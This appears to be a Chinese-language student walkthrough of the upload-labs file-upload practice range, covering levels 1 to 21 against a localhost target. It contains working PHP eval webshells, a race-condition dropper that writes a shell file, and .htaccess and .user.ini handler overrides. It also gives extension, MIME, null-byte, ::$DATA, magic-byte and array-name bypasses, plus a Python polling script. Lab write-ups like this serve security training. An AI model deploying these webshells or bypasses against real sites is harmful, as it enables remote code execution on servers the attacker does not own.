

## upload-labs 2023/10/21

先构造一个php文件用于存放（上传）php一句话木马

```php
@eval($_POST['hack']);
//@号表示后面的语句即使执行错误也不报错
//eval()函数的作用是把括号内的字符串全部当作php代码来执行
```

## less 1

script语言在前端做了验证
![image-20231021194120216](C:\Users\13461\AppData\Roaming\Typora\typora-user-images\image-20231021194120216.png)

那就先将后缀改成jpg 然后再用bp抓包改后缀名:
![image-20231021194520904](C:\Users\13461\AppData\Roaming\Typora\typora-user-images\image-20231021194520904.png)

尝试用蚁剑链接:
![image-20231021195835533](C:\Users\13461\AppData\Roaming\Typora\typora-user-images\image-20231021195835533.png)

链接成功!

![image-20231021200640469](C:\Users\13461\AppData\Roaming\Typora\typora-user-images\image-20231021200640469.png)也可以

------

## less 2

![image-20231021200815189](C:\Users\13461\AppData\Roaming\Typora\typora-user-images\image-20231021200815189.png)

![image-20231021200832220](C:\Users\13461\AppData\Roaming\Typora\typora-user-images\image-20231021200832220.png)

直接改包成 Content-Type: image/jpeg 就可以绕过了

------

## less 3

上传1.php 提示：不允许上传.asp,.aspx,.php,.jsp后缀文件！          

```php
$deny_ext = array('.asp','.aspx','.php','.jsp');
//可以看到这是一个黑名单
```

尝试改后缀名绕过 比如php3-php7 phtml 这些都可以被当做php文件解析
**直接抓包改成后缀php3即可 了解即可 文件靶场不支持中间件的解析 所以蚁剑链接不上**

------

## less 4

黑名单的.htaccess绕过

```php
<FilesMatch "\.jpg">
  SetHandler application/x-httpd-php
</FilesMatch>

    //.jpg 文件用php来解析
```

然后上传1.php
由于服务器关了.htaccess代替服务器配置文件 所以链接不会成功 了解即可 

------

## less 5

.user.ini
特定于用户或特定目录的配置文件 通常位于web应用程序的根目录下 可以覆盖或追加全局配置文件 如php.ini 中的配置选项 
作用范围是存放该文件的文件夹及其子目录 **（可以覆盖php.ini）**

这里要用到.user.ini的一段配置 

```php
auto_prepend_file=111.jpg
```

然后上传这个文件

也可以进行点加大小写绕过
![image-20231022154709166](C:\Users\13461\AppData\Roaming\Typora\typora-user-images\image-20231022154709166.png)

![image-20231022154730798](C:\Users\13461\AppData\Roaming\Typora\typora-user-images\image-20231022154730798.png)

在蚁剑链接的时候记得把后面的.去掉

------

## less 6

黑名单的大小写绕过 php改为Php即可

------

## less 7

黑名单的添加空格绕过

![image-20231022155417020](C:\Users\13461\AppData\Roaming\Typora\typora-user-images\image-20231022155417020.png)

------

## less 8

黑名单的添加dot绕过

![image-20231022155543110](C:\Users\13461\AppData\Roaming\Typora\typora-user-images\image-20231022155543110.png)

------

## less 9

黑名单的data数据流绕过
php在window的时候如果文件名+"::$DATA"会把::$DATA之后的数据当成文件流处理,不会检测后缀名，且保持"::$DATA"之前的文件名 他的目的就是不检查后缀名。

![image-20231022155721784](C:\Users\13461\AppData\Roaming\Typora\typora-user-images\image-20231022155721784.png)

注意 在蚁剑连接的时候不要加 ::$DATA

![image-20231022155810526](C:\Users\13461\AppData\Roaming\Typora\typora-user-images\image-20231022155810526.png)

------

##less 10

黑名单的点空格绕过

![image-20231022155944166](C:\Users\13461\AppData\Roaming\Typora\typora-user-images\image-20231022155944166.png)

![image-20231022160002051](C:\Users\13461\AppData\Roaming\Typora\typora-user-images\image-20231022160002051.png)

------

## less 11

```php
$file_name = str_ireplace($deny_ext,"", $file_name);
replace 不多解释基本双写都可以绕过
```

payload:

```php
http://localhost/upload-labs-master/upload/1.pphphp
注意php双写的位置 是pphphp 而不是phphpp 不然replace完就是hpp
```

------

## less 12

%00截断绕过 要在低版本php上运行 
![image-20231022162352082](C:\Users\13461\AppData\Roaming\Typora\typora-user-images\image-20231022162352082.png)

------

## less 13

0x00 截断 
burp抓包改包
选中+ ![image-20231022165744945](C:\Users\13461\AppData\Roaming\Typora\typora-user-images\image-20231022165744945.png)

然后再Hex中修改 +的Hex是2b 这里把+的Hex改成00 即可
![image-20231022165952716](C:\Users\13461\AppData\Roaming\Typora\typora-user-images\image-20231022165952716.png)

然后放包 只支持低版本php 高版本提示上传出错 了解即可 

------

## less 14

利用了头部二字节来判断文件类型 利用vscode来修改php的头字节来达到欺骗效果
jpg的头部字节: FF D8
那么我们就在1.php中前面插入两个空字节来修改成FF D8
![image-20231022172210677](C:\Users\13461\AppData\Roaming\Typora\typora-user-images\image-20231022172210677.png)

修改完毕 保存 上传
利用文件包含漏洞进行链接验证:

```php
localhost/upload-labs-master/include.php?file=./upload/3520231022171936.jpg
```

![image-20231022172317564](C:\Users\13461\AppData\Roaming\Typora\typora-user-images\image-20231022172317564.png)

发现包含成功了 链接尝试

![](C:\Users\13461\AppData\Roaming\Typora\typora-user-images\image-20231022172037321.png)

------

##  less 15

用cmd制作图片马:
![image-20231022180433203](C:\Users\13461\AppData\Roaming\Typora\typora-user-images\image-20231022180433203.png)

利用文件包含漏洞 如果报错那就是php版本的问题 换到最新版就行

![image-20231022181122841](C:\Users\13461\AppData\Roaming\Typora\typora-user-images\image-20231022181122841.png)

![image-20231022181201017](C:\Users\13461\AppData\Roaming\Typora\typora-user-images\image-20231022181201017.png)

------

## less 16

![image-20231022201621208](C:\Users\13461\AppData\Roaming\Typora\typora-user-images\image-20231022201621208.png)

原理还是和less14一样 直接上传less14或者less15的图片马就行了 不做过多的演示


------

## less 17

二次渲染绕过
这里建议用GIF图像会简单一些
先上传一张原始的gif:
然后从服务端另存为把渲染过的图片下载下来 然后用010编辑器和原始图片进行比较
![image-20231022204201800](C:\Users\13461\AppData\Roaming\Typora\typora-user-images\image-20231022204201800.png)

上面是经过二次渲染的图片 我们要做到绕过那就要在蓝色（相同）文件的尾端插入一句话木马 如图
然后保存 将这个文件再次上传到服务器 文件包含漏洞测试 最后蚁剑链接webshell
![image-20231022204346260](C:\Users\13461\AppData\Roaming\Typora\typora-user-images\image-20231022204346260.png)

------

## less 18

```php
//代码审计
$is_upload = false;
$msg = null;

if(isset($_POST['submit'])){
    $ext_arr = array('jpg','png','gif'); //白名单
    $file_name = $_FILES['upload_file']['name']; //文件名
    $temp_file = $_FILES['upload_file']['tmp_name']; //临时存放的文件名
    $file_ext = substr($file_name,strrpos($file_name,".")+1); //获取后缀
    $upload_file = UPLOAD_PATH . '/' . $file_name; //文件上传的路径

    if(move_uploaded_file($temp_file, $upload_file)){ //从临时目录移动到上传目录
        if(in_array($file_ext,$ext_arr)){
             $img_path = UPLOAD_PATH . '/'. rand(10, 99).date("YmdHis").".".$file_ext;
             rename($upload_file, $img_path);
             $is_upload = true;
        }else{
            $msg = "只允许上传.jpg|.png|.gif类型文件！";
            unlink($upload_file);
        }
    }else{
        $msg = '上传出错！';
    }
}
```

**文件是先到服务器上再判断文件类型是否合法**

所以存在条件竞争漏洞,开始构造小马:

```php
<?php fputs(fopen('er.php','w'),'<?php @eval($_POST["xek"]);?>');?>
    //fputs () 函数用于把字符串写入到指定的流中
    //fopen() 文件打开 指定打开文件'qwe.php' 'w'如果不存在那就以写入的方式写入到文件里面
```

然后burp suite抓包 发送2.php 抓包发送到攻击模块
![image-20231022220217500](C:\Users\13461\AppData\Roaming\Typora\typora-user-images\image-20231022220217500.png)

![image-20231022220235681](C:\Users\13461\AppData\Roaming\Typora\typora-user-images\image-20231022220235681.png)

先清除占位符

![image-20231022220251935](C:\Users\13461\AppData\Roaming\Typora\typora-user-images\image-20231022220251935.png)
改成无限次发送payloads
![image-20231022220325775](C:\Users\13461\AppData\Roaming\Typora\typora-user-images\image-20231022220325775.png)

修改线程数为25 到这里bp的工作就完成了 接下来准备编写py脚本来访问上传上去的2.php文件 

```python
import requests

url = 'http://localhost/upload-labs-master/upload/2.php'
while True:
    html = requests.get(url)
    if html.status_code == 200:
        print("er.php was finish")
        break
```

当运行成功时break并且print
最后用er.php来链接蚁剑 完成文件上传

![image-20231022220500976](C:\Users\13461\AppData\Roaming\Typora\typora-user-images\image-20231022220500976.png)

------

## less 19

apache解析漏洞 2.php.7z apache不会解析.7z 然后会自动想左找可以解析的后缀 找到了php就用php来解析
和less18同理 也是用条件竞争漏洞来做 由于靶场的问题 做不出来 写不了payload

------

## less 20

```php
$deny_ext = array("php","php5","php4","php3","php2","html","htm","phtml","pht","jsp","jspa","jspx","jsw","jsv","jspf","jtml","asp","aspx","asa","asax","ascx","ashx","asmx","cer","swf","htaccess");
//简单的黑名单 过滤不全
```

好多方法都可以绕过 **低版本php运行**
空格绕过 点绕过 user.ini绕过 

------

## less 21

```php
$is_upload = false; 
$msg = null; 
if(!empty($_FILES['upload_file'])){ 
    //检查MIME
    $allow_type = array('image/jpeg','image/png','image/gif');
    if(!in_array($_FILES['upload_file']['type'],$allow_type)){
        $msg = "禁止上传该类型文件!";
    }else{
        //检查文件名
        $file = empty($_POST['save_name']) ? $_FILES['upload_file']['name'] : $_POST['save_name'];
        if (!is_array($file)) {
            $file = explode('.', strtolower($file));
        }

        $ext = end($file);
        $allow_suffix = array('jpg','png','gif');
        if (!in_array($ext, $allow_suffix)) {
            $msg = "禁止上传该后缀文件!";
        }else{
            $file_name = reset($file) . '.' . $file[count($file) - 1];
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH . '/' .$file_name;
            if (move_uploaded_file($temp_file, $img_path)) {
                $msg = "文件上传成功！";
                $is_upload = true;
            } else {
                $msg = "文件上传失败！";
            }
        }
    }
}else{
    $msg = "请选择要上传的文件！";
}
```

先检查了MIME 是否为 $allow_type = array('image/jpeg','image/png','image/gif'); 中的三个

```php
$file = empty($_POST['save_name']) ? $_FILES['upload_file']['name'] : $_POST['save_name'];
        if (!is_array($file)) {
            $file = explode('.', strtolower($file));
        }
//检查文件名是否是数组 如果不是就创建一个数组 如果是那就不创建
```

```php
$ext = end($file);
        $allow_suffix = array('jpg','png','gif');
        if (!in_array($ext, $allow_suffix)) {
            $msg = "禁止上传该后缀文件!";
//检查数组最后一个是不是三个白名单里的后缀
            比如说 1.php
                数组会拆分成
                1
                php
                判断最后一个数组'php'是否合法
```

所以可以利用这个数组来绕过:
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210321172610126.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NzU5ODQwOQ==,size_16,color_FFFFFF,t_70)

upload-20.php被我们修改成了数组 所以不被拆分

```php
//然后我们又添加了一个png为save_name[2] 所以最后的结果为
save_name[0] upload-20.php
(save_name[1] (NULL))
save_name[2] png
//并且修改Content-Type值
    最后的流程是:
	//先判断Content-Type为image/png allow
	//判断数组最后一位是png allow
	//数组数量(2)-1 是空值 和save_name[0]合并 后面加上了'.' 最后变成了upload-20.php. 由于.会被windows自动解析掉 所以最后为upload-20.php
```

蚁剑尝试链接:

![image-20231022233635882](C:\Users\13461\AppData\Roaming\Typora\typora-user-images\image-20231022233635882.png)

